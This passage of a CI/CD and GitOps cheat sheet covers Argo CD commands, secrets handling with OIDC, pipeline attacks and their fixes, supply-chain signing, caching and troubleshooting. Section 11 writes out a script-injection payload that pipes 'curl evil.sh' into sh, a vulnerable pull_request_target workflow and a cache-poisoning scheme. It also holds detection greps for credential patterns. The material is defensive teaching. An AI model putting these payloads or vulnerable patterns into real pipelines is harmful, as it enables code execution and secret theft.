argocd app actions run shop-production-checkout restart --kind Rollout --resource-name checkout
argocd app logs shop-production-checkout --tail 200 --follow
argocd app set shop-production-checkout --sync-policy none      # ⭐ disable auto-sync
argocd app set shop-production-checkout --sync-policy automated --auto-prune --self-heal
argocd app unset shop-production-checkout --parameter image.tag  # remove a override
argocd app create shop-dev-checkout \
  --repo https://github.com/3558Bhk/shop-config \
  --path apps/base --dest-server https://kubernetes.default.svc \
  --dest-namespace shop-dev --project shop-dev \
  --helm-value-file environments/dev/values-dev.yaml \
  --sync-policy automated --auto-prune --self-heal
argocd app delete shop-dev-checkout --cascade               # ⚠️ deletes the resources
argocd app delete shop-dev-checkout --no-cascade            # ⭐ leaves them running
argocd app patch shop-production-checkout --patch '{"spec":{"replicas":10}}' --type merge
argocd app patch-resource shop-production-checkout \
  --kind Rollout --resource-name checkout \
  --patch '{"status":{"paused":false}}' --type merge
argocd app get shop-production-checkout -o json | jq '.status | {sync, health, operationState}'
argocd appset list && argocd appset get shop
argocd proj list && argocd proj get shop-production
argocd proj add-source shop-production https://github.com/3558Bhk/shop-config
argocd proj remove-source shop-production '*'
argocd proj add-destination shop-production https://kubernetes.default.svc shop
argocd proj allow-cluster-resource shop-production '*'      # ⛔ don't
argocd proj deny-cluster-resource shop-production '*'       # ⭐ do
argocd repo list && argocd repo add https://github.com/3558Bhk/shop-config \
  --username bot --password "$PAT" --upsert --project shop-production
argocd cert list && argocd cluster list
argocd cluster add kind-cicd --name kind-cicd --upsert
argocd admin settings rbac can admin 'applications' sync 'shop-production/checkout'
argocd admin proj add-orphaned-resources
argocd admin repo ssh-key ...
argocd notifications template list
```

### 9.2 The GitOps rules ⭐

```
RULE 1 ⭐⭐ TWO REPOSITORIES.
  The app repo (code) and the config repo (manifests + digests) are separate.
  CI writes to the config repo. A promotion is a PR there. That PR is the
  audit trail, the approval gate and the rollback mechanism, all in one.

RULE 2 ⭐ CI HOLDS NO CLUSTER CREDENTIALS.
  grep every secret in every CI tool. If a kubeconfig is there, you're doing
  push-based CD, and a compromised CI = a compromised cluster.

RULE 3 ⭐⭐ ARGO CD IS THE ONLY THING WITH CLUSTER WRITE ACCESS.
  Its own ServiceAccount, with an AppProject bounding what it may create.

RULE 4 ⭐ AUTO-SYNC dev and staging. NEVER auto-sync production.
  A human clicks Sync. That human is the last line of defense and they should
  have the cluster in front of them.

RULE 5 ⭐ selfHeal: true in non-production.
  It reverts `kubectl edit` within 3 minutes. In production, selfHeal is a
  policy decision — it will also revert your break-glass fix.

RULE 6 ⭐ prune: true, allowEmpty: false.
  Prune deletes what Git no longer contains. `allowEmpty: false` stops a bad
  path from wiping a namespace.

RULE 7 ⭐⭐ ignoreDifferences on /status and /spec/replicas.
  Argo Rollouts and the HPA both own `replicas`. Without this, Argo CD and
  Argo Rollouts fight forever in a sync loop.

RULE 8 ⭐ ServerSideApply=true.
  Client-side apply hits the 262144-byte last-applied-configuration annotation
  limit on big CRDs. Server-side apply doesn't.

RULE 9 ⭐ CODEOWNERS on environments/production/**.
  The config repo IS the deployment mechanism. Protect it like production.

RULE 10 ⭐ the config repo has CI too.
  helm lint, kubeconform, a Kyverno dry-run, conftest/OPA, and a diff preview
  as a PR comment. A bad manifest merged to main deploys in 3 minutes.

RULE 11 ⭐⭐ a rollback is a git revert, and it goes through the same path.
  Progressive delivery applies to rollbacks. If it's an emergency,
  `argo rollouts promote --full` skips the pauses — but you still revert Git.

RULE 12 ⭐ the digest file is small on purpose.
  CI touches a file containing ONLY: repository, digest, revision, promotedAt,
  promotedBy, promotedFromRun. A reviewer sees a 6-line diff. That's the point.
```

---

<a name="10--secrets-the-ladder-"></a>
## 10 · ⭐ Secrets: the ladder

```
RUNG 0 ⛔⛔⛔ HARDCODED IN THE PIPELINE FILE
  → in Git, in the build log, in the runner's env, forever.
  → the most common finding in every security audit.

RUNG 1 ⛔ A PLAINTEXT PIPELINE VARIABLE
  → stored in the tool, visible to anyone with project access, printed on error.

RUNG 2 ⚠️ AN ENCRYPTED SECRET IN THE CI TOOL
  → GitHub `secrets.X`, ADO secret variables, Jenkins credentials.
  → ⭐ masked in logs, but NOT in a `run: env | sort` or `set -x` or a
     `printenv | base64` step. Masking is a log filter, not encryption.
  → scoped to the whole repo/org unless you use environments.
  → this is where 80% of shops stop. It's not terrible. It's not good.

RUNG 3 ⭐ A SECRET MANAGER + SHORT-LIVED CREDENTIALS
  → Azure Key Vault / AWS Secrets Manager / GCP Secret Manager / HashiCorp Vault
  → the CI tool fetches at runtime; the secret is never stored in CI.
  → Vault dynamic secrets: a DB credential that EXPIRES in 1 hour.
  → ⭐ still requires a bootstrap credential to reach the manager. Which is…

RUNG 4 ⭐⭐⭐ WORKLOAD IDENTITY FEDERATION / OIDC — NO STORED SECRET AT ALL
  → the CI platform mints a signed OIDC token identifying the RUN.
  → the cloud provider TRUSTS that issuer and exchanges the token for a
     short-lived credential.
  → ⭐ there is no long-lived secret anywhere to steal, leak, or forget to rotate.
```

### 10.1 Rung 4, in all three tools

```yaml
# 🐙 GITHUB ACTIONS — OIDC to AWS
permissions: {id-token: write, contents: read}     # ⭐⭐ REQUIRED
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/github-shop-deploy
    aws-region: eu-west-1
    role-session-name: gha-${{ github.run_id }}-${{ github.run_attempt }}
    role-duration-seconds: 900                     # ⭐ 15 minutes
# ⭐ the AWS trust policy — SCOPE IT BY `sub`:
#   "sub": "repo:3558Bhk/shop:environment:production"     ← ⭐⭐ the narrowest
#   "sub": "repo:3558Bhk/shop:ref:refs/heads/main"        ← branch-scoped
#   "sub": "repo:3558Bhk/shop:*"                          ← ⛔ any run, any branch,
#                                                            INCLUDING a fork PR
```

```yaml
# 🐙 GITHUB ACTIONS — OIDC to Azure
- uses: azure/login@v2
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
    # ⭐⭐ NO client-secret. That's the point.
# the federated credential's SUBJECT:
#   repo:3558Bhk/shop:environment:production
#   repo:3558Bhk/shop:ref:refs/heads/main
```

```yaml
# 🐙 GITHUB ACTIONS — OIDC to GCP
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: projects/123/locations/global/workloadIdentityPools/gha/providers/shop
    service_account: deploy@shop.iam.gserviceaccount.com
# the GCP attribute condition:
#   attribute.repository == '3558Bhk/shop' && attribute.ref == 'refs/heads/main'
```

```yaml
# 🔷 AZURE DEVOPS — Workload Identity Federation (GA)
- task: AzureCLI@2
  inputs:
    azureSubscription: shop-wif          # ⭐ a WIF service connection, NO secret
    addSpnToEnvironment: true            # ⭐⭐ exposes $idToken
    scriptType: bash
    inlineScript: |
      set -euo pipefail
      echo "tenant=$tenantId"            # these come from addSpnToEnvironment
      echo "client=$servicePrincipalId"
      # ⭐ $idToken is the JWT to exchange with AWS/GCP/sigstore
      aws sts assume-role-with-web-identity \
        --role-arn "$AWS_ROLE" --role-session-name ado-$BUILD_BUILDID \
        --web-identity-token "$idToken" --duration-seconds 900 \
        --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
# ⭐ the WIF subject claim is: <orgId>/<projectId>/<environment>
#    → condition the trust on that, not on "*"
```

```groovy
// 🔨 JENKINS — the OIDC Provider plugin
// Manage Jenkins → Plugins → "OpenID Connect Provider"
//   ⭐ Jenkins becomes an OIDC ISSUER for its own jobs.
// The token's claims include:
//   sub: the job's full name (shop/main/checkout)
//   jenkins_scm_ref: refs/heads/main          ⭐ the branch
//   jenkins_job_name, jenkins_job_full_name
//   aud: whatever you configured
withOIDCToken(audience: 'aws', additionalClaims: [job_name: env.JOB_NAME]) {
  sh '''
    set -euo pipefail
    # $OIDC_TOKEN is in the environment, and it's a real signed JWT
    aws sts assume-role-with-web-identity \
      --role-arn "$AWS_ROLE" --role-session-name "jenkins-$BUILD_NUMBER" \
      --web-identity-token "$OIDC_TOKEN" --duration-seconds 900
  '''
}
// ⭐ the AWS trust policy conditions:
//   StringEquals: {accounts.google.com:aud OR your issuer's aud: "aws"}
//   StringLike:   {"jenkins_scm_ref": "refs/heads/main"}    ← ⭐⭐ branch-scoped
//   StringEquals: {"sub": "shop/main/checkout"}             ← ⭐ job-scoped
// ⚠️ JENKINS-SPECIFIC RISK: whoever can EDIT a Jenkinsfile can change the job's
//    identity claims' MEANING. The `sub` is the job name, so a job named
//    "shop/main/checkout" gets checkout's role — and creating a job requires
//    Job/Create permission. Scope that tightly.
```

### 10.2 ⭐ The `sub` scoping quick-reference

```
GITHUB ACTIONS `sub` values (narrowest → widest):
  repo:OWNER/REPO:pull_request                      ⛔⛔ ANY fork PR
  repo:OWNER/REPO:ref:refs/heads/feature/x          a branch
  repo:OWNER/REPO:environment:NAME                  ⭐⭐ an environment
  repo:OWNER/REPO:ref:refs/heads/main:environment:production   ⭐⭐⭐ both
  repo:OWNER/REPO:*                                 ⛔ anything in the repo
  repo:OWNER/*                                      ⛔⛔ every repo you own

AZURE DEVOPS WIF subject:  <orgId>/<projectId>/<environmentName>
GCP: attribute.repository + attribute.ref + attribute.actor
AWS: the `sub`/`aud` conditions in the trust policy

⭐⭐ THE RULE: condition on the ENVIRONMENT, not just the repo.
   `environment:production` means the token only exists for a job that
   explicitly declares `environment: production` — which is gated by
   protection rules and reviewers. That converts "who can run a workflow"
   into "who can approve a production deployment".
```

### 10.3 ⭐ Secret-scanning: the control that catches rung 0 and 1

```bash
# ── in the repo, on every commit ────────────────────────────────
trivy fs --scanners secret --severity CRITICAL,HIGH --exit-code 1 .
gitleaks detect --source . --redact --exit-code 1 --log-opts="--all"   # ⭐ ALL history
detect-secrets scan --all-files > .secrets.baseline
detect-secrets audit .secrets.baseline
grep -rnE '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|xox[baprs]-|-----BEGIN [A-Z ]*PRIVATE KEY-----)' \
  --exclude-dir={node_modules,.git,vendor} . && echo "⛔ FOUND" || echo "✅ clean"
# ⭐⭐ and scan the HISTORY, not just HEAD:
git log --all -p | gitleaks detect --no-git - --redact

# ── on the platform ─────────────────────────────────────────────
# GitHub: Settings → Code security → Secret scanning + Push protection ⭐⭐
#         Push protection BLOCKS the push. Secret scanning only tells you after.
gh api repos/3558Bhk/shop/secret-scanning/alerts --jq '.[] | select(.state=="open")'
# Azure DevOps: a CredScan task in the pipeline
# Jenkins: no built-in — run gitleaks as a stage in EVERY job (a shared library step)

# ── ⭐⭐ IF A SECRET EVER LEAKED: ROTATE, DON'T DELETE ───────────
# Deleting the commit does nothing. It's in:
#   every clone, every fork, every runner's cache, every CI log, every
#   artifact, the platform's internal storage, and anyone's shell history.
# 1. ROTATE the credential FIRST. The old value becomes worthless.
# 2. THEN purge: git filter-repo / BFG, force-push, and ask the platform to
#    expire cached views.
# 3. THEN find where it went: grep every build log for the run period.
# 4. THEN write the post-mortem: how long was it exposed, what could it do.
```

---

<a name="11--pipeline-security-the-attacks-"></a>
## 11 · ⭐ Pipeline security: the attacks

### 11.1 The five that actually happen

```
⛔ ATTACK 1: "pwn request" — `pull_request_target` + checkout of the PR code
──────────────────────────────────────────────────────────────────────────
on: pull_request_target          # ⚠️ runs with the BASE repo's secrets and a
                                 #    WRITE token, in the base repo's context
steps:
  - uses: actions/checkout@v7
    with:
      ref: ${{ github.event.pull_request.head.sha }}   # ⛔⛔ the ATTACKER's code
  - run: npm ci && npm test                            # ⛔ runs it, WITH SECRETS
# ⭐ THE FIX:
#   · use `pull_request` (no secrets, read-only token) for anything that runs
#     the PR's code
#   · use `pull_request_target` ONLY for things that comment, label or report —
#     and NEVER check out and execute the PR's code in it
#   · if you must build the PR's code with secrets: build it in an ISOLATED
#     workflow triggered by `workflow_run`, after a human approved it
# ⭐ THE TEST: open a PR from a fork whose workflow prints `env | sort`.
#    If secrets appear, you're vulnerable.

⛔ ATTACK 2: script injection through an untrusted expression
──────────────────────────────────────────────────────────────────────────
- run: echo "Processing ${{ github.event.issue.title }}"
#   an issue titled:  a"; curl evil.sh | sh; echo "
#   becomes:          echo "Processing a"; curl evil.sh | sh; echo ""
# ⛔ THE SAME BUG IN JENKINS:
sh "echo ${params.TITLE}"        # ⛔ Groovy interpolation into a double-quoted shell
# ⭐ THE FIX — pass it through the ENVIRONMENT, never the command line:
env:
  TITLE: ${{ github.event.issue.title }}
- run: echo "Processing $TITLE"
# ⭐ JENKINS:
withEnv(["TITLE=${params.TITLE}"]) { sh 'echo "Processing $TITLE"' }
# ⭐⭐ EVERY untrusted field is a vector:
#   github.event.issue.title / .body
#   github.event.pull_request.title / .body
#   github.event.comment.body
#   github.event.review.body
#   github.head_ref                 ← ⭐ the BRANCH NAME. Yes, really.
#   github.event.workflow_run.head_commit.message
#   a git TAG NAME
#   a filename in the repo
#   params.* in Jenkins
#   a build's display name

⛔ ATTACK 3: a self-hosted runner/agent on a public repository
──────────────────────────────────────────────────────────────────────────
# A fork PR runs attacker code ON YOUR HARDWARE. That machine has:
#   · your registry credentials in its Docker config
#   · a service-account token for your cluster
#   · the workspace of the PREVIOUS job (unless you clean it)
#   · network access to your internal services
# ⭐ THE FIX: never self-host on a public repo. If you must:
#   · require approval for first-time contributors' workflows
#   · ephemeral runners only (--ephemeral, one job then destroy)
#   · a fresh container per job, no persistent workspace
#   · a network policy that blocks the runner from everything but the registry
# ⭐ JENKINS EQUIVALENT: forkPullRequestDiscoveryTrait + trustNobody().

⛔ ATTACK 4: cache and artifact poisoning
──────────────────────────────────────────────────────────────────────────
# A PR build writes to a cache key that main also reads:
cache-from: type=gha,scope=deps      # ⛔ shared between PR and main
# The PR poisons the cache with a malicious node_modules/.bin/preinstall.
# Main's next build restores it and executes it — with main's secrets.
# ⭐ THE FIX:
#   · scope caches per ref: scope=deps-${{ github.ref }}
#   · NEVER execute anything restored from a cache without verifying it
#   · treat artifacts as untrusted input: a PR job's artifact must not be
#     executed by a privileged job without a human approval between them
#   · ⭐ Jenkins: `stash`/`unstash` has the same property. A `stash` from a
#     fork PR build must not be `unstash`ed by a privileged job.

⛔ ATTACK 5: an over-permissioned token
──────────────────────────────────────────────────────────────────────────
# The default GITHUB_TOKEN has contents:write, packages:write,
# pull-requests:write, issues:write, deployments:write… in the ORG default.
# A script-injection exploit therefore gets write access to your code.
# ⭐ THE FIX:
#   · set the ORG default to READ-ONLY
#   · declare `permissions: {}` at the workflow level, and add ONLY what's needed
#   · declare per-job permissions where a job needs more
# ⭐ JENKINS EQUIVALENT: a credential scoped GLOBALLY is readable by every job.
#   Folder-scope it. And the Script Console is worse than any token — it owns
#   every credential in the instance.
```

### 11.2 The controls

```
CODE
  □ ⭐⭐ CODEOWNERS on .github/**, azure-pipelines.yml, Jenkinsfile, and the
       config repo's policies/**. A pipeline change IS a security change.
  □ branch protection / rulesets: required reviews, required checks, no
    force-push, no deletion, require signed commits, require linear history
  □ ⭐ a required status check that runs the pipeline-security linter

SCANNING
  □ actionlint (GitHub Actions)        ← ⭐ catches most YAML/injection bugs
  □ hadolint / dockerfile-lint
  □ ⭐ semgrep with the CI rules:  semgrep --config p/github-actions --config p/ci-security .
  □ gitleaks / trivy --scanners secret (on the HISTORY, not just HEAD)
  □ ⭐ step-security/harden-runner — an egress allowlist per job. It tells you
       exactly what a job talks to, and blocks everything else.
  □ Jenkins: no built-in linter. ⭐ Write one: a shared-library pre-flight that
       greps the Jenkinsfile for `sh "`, `evaluate(`, `GroovyShell`,
       `trustEveryone`, and `numExecutors` on the controller.

RUNTIME
  □ `permissions: {}` everywhere; add only what's needed
  □ SHA-pinned actions; Dependabot on github-actions
  □ OIDC/WIF instead of stored keys
  □ environments with required reviewers for production
  □ ephemeral runners; clean the workspace
  □ ⭐ Jenkins: `sandbox: true` on every Groovy step, and NO approved script
       signatures without a named reviewer
  □ ⭐ Jenkins: the "Agent → Controller access control" allowlist

AUDIT
  □ who can edit a pipeline file? (the answer is "who can deploy")
  □ who can approve a production deployment?
  □ who can read a production secret? Test it with a job that tries.
  □ who has the Script Console / the admin role? Log its use.
  □ ⭐ a monthly review of: org-level secrets, environment protection rules,
       branch policies, the CODEOWNERS file, and the plugin inventory
```

```bash
# ⭐ the pre-commit / CI security lint, all three tools
actionlint .github/workflows/*.yml            # ⭐ GitHub Actions
shellcheck -x ci/*.sh scripts/*.sh            # ⭐ all the shell
hadolint apps/*/Dockerfile                    # ⭐ the Dockerfiles
kubeconform -strict -summary /tmp/rendered.yaml   # the manifests
helm lint apps/base --strict
trivy config helm/ apps/                      # ⭐ misconfigurations
semgrep --config p/github-actions --error .   # ⭐ CI-specific rules
gitleaks detect --source . --redact --exit-code 1
conftest test /tmp/rendered.yaml -p policy/   # OPA/Rego
kyverno apply policies/ --resource /tmp/rendered.yaml --policy-report
# ⭐ Jenkins: a Groovy AST check in the shared library's CI (JenkinsPipelineUnit)
#   plus this grep, which catches 90% of injection:
grep -nE 'sh\s+"[^"]*\$\{|sh\s+"[^"]*\$\{params|sh\s+"[^"]*\$\{env\.(?!JOB|BUILD|GIT)' \
  $(find . -name 'Jenkinsfile*' -o -name '*.groovy' | grep -v test) && \
  echo "⛔ double-quoted sh with interpolation — review every one" || echo "✅ clean"
```

---

<a name="12--supply-chain-signing--sbom--provenance"></a>
## 12 · Supply chain: signing, SBOM, provenance

```bash
# ── cosign ──────────────────────────────────────────────────────
cosign version
cosign generate-key-pair                      # cosign.key + cosign.pub
# ⭐⭐ KEYLESS (the right way, with OIDC):
cosign sign --yes $IMAGE@$DIGEST
cosign sign --yes \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity 'https://github.com/3558Bhk/shop/.github/workflows/ci.yml@refs/heads/main' \
  $IMAGE@$DIGEST
# ⭐ VERIFY — and the identity conditions are the WHOLE POINT:
cosign verify $IMAGE@$DIGEST \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  --certificate-identity-regexp '^https://github.com/3558Bhk/shop/\.github/workflows/.*@refs/heads/main$' \
  | jq '.[0] | {critical: .critical.identity, issuer: .optional.Issuer, subject: .optional.Subject}'
cosign verify --key cosign.pub $IMAGE@$DIGEST          # key-based
cosign verify --certificate-identity-regexp '.*' $IMAGE@$DIGEST   # ⛔ too loose
# ⭐ attestations:
cosign attest --yes --type cyclonedx --predicate sbom.cdx.json $IMAGE@$DIGEST
cosign attest --yes --type slsaprovenance --predicate provenance.json $IMAGE@$DIGEST
cosign attest --yes --type custom --predicate build-record.json $IMAGE@$DIGEST
cosign attest --yes --type vuln --predicate vuln-report.json $IMAGE@$DIGEST   # ⭐ a scan result
cosign verify-attestation --type cyclonedx $IMAGE@$DIGEST | jq -r '.payload' | base64 -d | jq
cosign verify-attestation --type slsaprovenance --key cosign.pub $IMAGE@$DIGEST
# ⭐ the transparency log:
cosign verify --rekor-url https://rekor.sigstore.dev …
curl -s "https://rekor.sigstore.dev/api/v1/log/entries?logIndex=$IDX" | jq
rekor-cli search --sha $(sha256sum sbom.cdx.json | cut -d' ' -f1)
# ⭐ key rotation and revocation:
cosign piv-tool …            # a hardware key
cosign sign-blob --key cosign.key file.txt
cosign verify-blob --certificate cert.pem --bundle bundle.sigstore file.txt

# ── the three artifacts you attach ──────────────────────────────
# 1. SBOM — what's IN it
syft $IMAGE@$DIGEST -o cyclonedx-json=sbom.cdx.json
syft $IMAGE@$DIGEST -o spdx-json=sbom.spdx.json
syft dir:. -o cyclonedx-json=sbom.cdx.json          # ⭐ the source, not the image
cyclonedx-cli convert --input-format json --output-format xml -i sbom.cdx.json
# ⭐ VEX — which of those vulnerabilities actually AFFECT you
syft $IMAGE@$DIGEST -o cyclonedx-json | vexctl attestation --format openvex --output vex.json …
# 2. PROVENANCE — how it was BUILT (SLSA)
#    BuildKit: --provenance=mode=max  → in the image index
#    slsa-github-generator: a separate workflow producing a signed attestation
#    ⭐ the SLSA levels: L1 (a script), L2 (signed, hosted CI), L3 (hardened,
#       non-falsifiable, isolated) — most shops target L2 and claim L3 wrongly.
# 3. SCAN RESULTS — what's WRONG with it
trivy image --format json --output trivy.json $IMAGE@$DIGEST
cosign attest --type vuln --predicate trivy.json $IMAGE@$DIGEST

# ── verify in the CLUSTER (Kyverno) ⭐⭐ the control that matters ─
# verifyImages: with imageReferences, attestors (keys + rekorURL),
#   identities (issuer + subject), mutateDigest: true, required: true
# ⭐⭐ mutateDigest: true — rewrites the pod's image to the VERIFIED digest,
#    defeating a verify-then-tag-move (TOCTOU) attack.
# ⭐ failurePolicy: Fail — if Kyverno is down, REJECT rather than allow.
# See capstone §4.2 for the full policy.

# ── and the nightly scan of what is ALREADY RUNNING ─────────────
# ⭐⭐ build-time gates protect the NEXT deploy. Inventory scanning protects
#    what's live. A CVE published after the build ran is caught by nothing else.
# See capstone Task C.1 for the workflow.
```

---

<a name="13--caching"></a>
## 13 · Caching

```yaml
# ── 🐙 GitHub Actions ───────────────────────────────────────────
- uses: actions/cache@v4
  with:
    path: |
      ~/.m2/repository
      ~/.gradle/caches
      ~/.npm
      ~/go/pkg/mod
    key: ${{ runner.os }}-maven-${{ hashFiles('apps/shop-api/pom.xml') }}
    restore-keys: |
      ${{ runner.os }}-maven-
    save-always: true                 # ⭐ save even if the job fails
    enableCrossOsArchive: false
    fail-on-cache-miss: false
    lookup-only: false                # ⭐ true = just check, don't download
# ⭐ the BUILT-IN caches (simpler, and usually enough):
- uses: actions/setup-java@v5
  with: {distribution: temurin, java-version: '21', cache: maven}
- uses: actions/setup-node@v4
  with: {node-version: '22', cache: npm, cache-dependency-path: 'apps/shop-ui/package-lock.json'}
- uses: actions/setup-go@v5
  with: {go-version: '1.23'}          # ⭐ caches by default
- uses: actions/setup-python@v5
  with: {python-version: '3.13', cache: pip, cache-dependency-path: 'requirements.txt'}
# ⭐⭐ the DOCKER layer cache — the biggest win of all:
cache-from: type=gha,scope=${{ matrix.service }}
cache-to:   type=gha,mode=max,scope=${{ matrix.service }}
# ⚠️ GHA cache limits: 10 GB per repo, LRU-evicted after 7 days of no access.
#    A 10 GB node_modules cache will be evicted constantly. Cache the
#    DEPENDENCY files, not the build output.

# ── 🔷 Azure DevOps ─────────────────────────────────────────────
- task: Cache@2
  inputs:
    key: 'maven | "$(Agent.OS)" | apps/shop-api/pom.xml'
    restoreKeys: |
      maven | "$(Agent.OS)"
    path: $(Pipeline.Workspace)/.m2
    cacheHitVar: CACHE_RESTORED         # ⭐ set to 'true'/'false'
    failOnCacheMiss: false
- bash: ./mvnw -Dmaven.repo.local=$(Pipeline.Workspace)/.m2 verify
# ⚠️ ADO cache: 10 GB per project on the free tier. Microsoft-hosted agents
#    are FRESH each run — there is no local cache at all without this task.
# ⭐ the Docker registry cache works the same way:
#    --cache-from type=registry,ref=$IMAGE:buildcache --cache-to type=registry,…,mode=max

# ── 🔨 Jenkins ⭐ the hardest one, because agents are ephemeral ──
// ⭐ OPTION A: a ReadWriteMany PVC in the pod template
volumes:
  - name: m2
    persistentVolumeClaim: {claimName: jenkins-m2-cache}
containers:
  - name: tools
    volumeMounts: [{name: m2, mountPath: /home/jenkins/.m2}]
// ⭐ OPTION B: a cache server (the right answer at scale)
//    Sonatype Nexus / JFrog Artifactory as a Maven/npm/Go/Docker proxy.
//    Every pod hits the internal proxy. This is what a real shop does.
// ⭐ OPTION C: sccache with an S3/GCS backend for Rust/Go/C++
env:
  SCCACHE_BUCKET: shop-ci-cache
  SCCACHE_REGION: eu-west-1
// ⭐ OPTION D: the Job Cacher plugin (archives a directory to storage)
cache(caches: [arbitraryFileCache(path: '~/.m2', includes: '**/*', cacheValidityDecidingFile: 'pom.xml')]) {
  sh './mvnw verify'
}
// ⭐ OPTION E: Kaniko's registry cache (the only Docker-layer option in a pod)
--cache=true --cache-repo=$IMAGE-cache --cache-ttl=168h --cache-copy-layers=true
// ⭐ MEASURE IT: cache-hit ratio per tool. See capstone Task C.4 —
//    Jenkins was 0.4 and GitHub 1.7, and the fix was a ReadWriteMany PVC.
```

```bash
# ── the debugging commands ──────────────────────────────────────
gh api repos/3558Bhk/shop/actions/caches --jq '.total_count, (.actions_caches[] | {key, size_in_bytes, last_accessed_at})'
gh cache list && gh cache delete --all
gh api -X DELETE repos/3558Bhk/shop/actions/caches
# ⭐ the "why is my build slow" triage:
gh api repos/3558Bhk/shop/actions/runs/$ID/timing --jq '.jobs[] | "\(.name): \(.started_at) → \(.completed_at)"'
gh run view $ID --log | grep -E 'Cache restored|Cache saved|Post job cleanup'
```

---

<a name="14--troubleshooting-the-matrix-"></a>
## 14 · ⭐⭐ Troubleshooting: the matrix

### 14.1 Universal (all three tools)

| Symptom | Cause | Fix |
|---|---|---|
| The pipeline doesn't trigger at all | a `paths:` filter excluded it; the branch isn't in `branches:`; the webhook isn't configured | `gh run list` / ADO runs / Jenkins → check the trigger config. Temporarily remove `paths:`. |
| It triggers on the PR but not the push | `on: pull_request` and `on: push` are separate events | add both, or use `pull_request_target` (carefully — §11) |
| It triggers TWICE per PR | both `push` (to the branch) and `pull_request` fire | add `if: github.event_name != 'pull_request'` to one, or drop the push trigger for feature branches |
| ⭐ Secrets are empty | the job lacks `environment:`; a reusable workflow doesn't inherit; the secret is org-level but the repo isn't allowed | print `${{ secrets.X != '' }}` (never the value). Check the scope. |
| A variable is empty in a `run:` | you used `${{ }}` inside a single-quoted shell, or `$VAR` without `env:` | `echo "${{ vars.X }}"` in YAML context; `$X` in shell context after `env: {X: …}` |
| The build works locally and fails in CI | ⭐ a missing dependency, a different shell, a different PATH, no network, a different timezone, a case-sensitive filesystem | run the CI image locally: `docker run -it -v $PWD:/w -w /w ubuntu:24.04 bash` |
| Flaky failures | a port race, a timing assumption, a shared cache, a test ordering dependency | `retry(2)` is a band-aid. Find the race. Add `waitUntil` on readiness, not `sleep`. |
| The build hangs | ⭐ no `timeout` anywhere | add `timeout-minutes` / `timeoutInMinutes` / `options { timeout() }`. ALWAYS. |
| Out of disk | a huge artifact, an unclean workspace, Docker layers | `docker system prune -af`, `cleanWs()`, `retention-days: 1`, cache the deps not the output |
| Out of memory | a JVM without `-Xmx` in a container, a big Gradle daemon | `MAVEN_OPTS=-Xmx2g`, `GRADLE_OPTS=-Xmx2g --no-daemon`, raise the runner size |
| A step needs the previous step's output and gets nothing | outputs are per-step, not global | use `id:` + `$GITHUB_OUTPUT` / `##vso[task.setvariable]` / `env.X =` |
| The same job runs 4× | a matrix with 4 entries and `fail-fast: true` killing siblings | `fail-fast: false` and read the actual failures |
| "The job was not started because recent account payments have failed" | billing | check the minutes quota; add a spending limit; cache harder |
| Timezone surprises | ⭐ every scheduler is UTC | `0 3 * * *` = 08:30 IST. Write the IST time in a comment. |
| A cron job doesn't run | ⭐ GitHub disables scheduled workflows after 60 days of repo inactivity | re-enable it. And add an alert if it didn't run (an absent-metric alert). |

### 14.2 🐙 GitHub Actions

| Symptom | Cause | Fix |
|---|---|---|
| `Resource not accessible by integration` | the `GITHUB_TOKEN` lacks the permission | add it to `permissions:`. Check the org default is read-only. |
| `Not found` on a private repo from an action | the action's token has no access | pass `token: ${{ secrets.PAT }}` or use a GitHub App token |
| `Error: Process completed with exit code 1` with no detail | the log is truncated | `gh run view $ID --log-failed`; add `set -x` temporarily |
| A `needs:` job is skipped and its dependents too | ⭐ a skipped need makes the dependent skip by default | `if: always() && needs.x.result != 'cancelled'` or `!cancelled()` |
| `Matrix must define at least one vector` | a dynamic matrix produced `[]` | guard it: `if: needs.m.outputs.matrix != '[]'` |
| `The template is not valid` | a `${{ }}` inside a `run:` that YAML tried to parse | quote the whole `run:` value; avoid `:` after a value |
| ⭐ `Unexpected value '…'` on a boolean input | `with:` inputs are STRINGS | `if: inputs.dry_run == 'true'`, not `if: inputs.dry_run` |
| `upload-artifact` fails with "artifact already exists" | v4 artifacts are immutable; a matrix leg used the same name | make the name unique: `name: coverage-${{ matrix.service }}` |
| The cache isn't hit | the key changed (a lockfile bump); the branch scope differs; 10 GB evicted | `restore-keys:` with a prefix; check `gh cache list` |
| `docker/build-push-action` "cannot push, no credentials" | the login step was skipped or is in a different job | jobs don't share state — login in the same job |
| `Error: The runner has received a shutdown signal` | the hosted runner hit its 6-hour limit, or was preempted | split the job; use `timeout-minutes` below the limit |
| A composite action's `if:` doesn't work | composite actions can't use job-level `if:` on `uses:` | move the condition inside, or use a reusable workflow |
| `workflow_run` sees the wrong code | ⭐ `workflow_run` ALWAYS runs on the DEFAULT branch | pass data via artifacts or the API, never via the checkout |
| A fork PR gets no secrets | ⭐ by design | approve the first run; or use `pull_request_target` (carefully) |
| `::error::` doesn't fail the step | it's just an annotation | `exit 1` as well |
| OIDC: "Token request failed" | `id-token: write` is missing | add it to `permissions:` at the job level |
| OIDC: AWS "InvalidIdentityToken" | the trust policy's `sub` doesn't match | `aws sts decode-authorization-message`; print the token's `sub` claim |

### 14.3 🔷 Azure DevOps

| Symptom | Cause | Fix |
|---|---|---|
| ⭐ `$(X)` doesn't expand in a `condition:` | macro syntax isn't supported in conditions | `condition: eq(variables['X'], 'yes')` |
| A cross-stage output is empty | the wrong expression syntax | `$[ stageDependencies.StageName.outputs['JobName.StepName.var'] ]` and the step must have `name:` + `isOutput=true` |
| `The pipeline is not valid: job X references stage Y which does not exist` | a typo in `dependsOn` | `dependsOn` takes stage NAMES, not display names |
| A template parameter is empty | `${{ }}` vs `$()` — template params use `${{ }}` | `${{ parameters.x }}`; and parameters must be declared with `parameters:` |
| `Template not found` | the resource reference is wrong | `resources: repositories: [{repository: templates, …}]` then `template: x.yml@templates` |
| A variable group secret is masked as `***` in a URL | ⭐ by design | don't put secrets in URLs. Use a header or a file. |
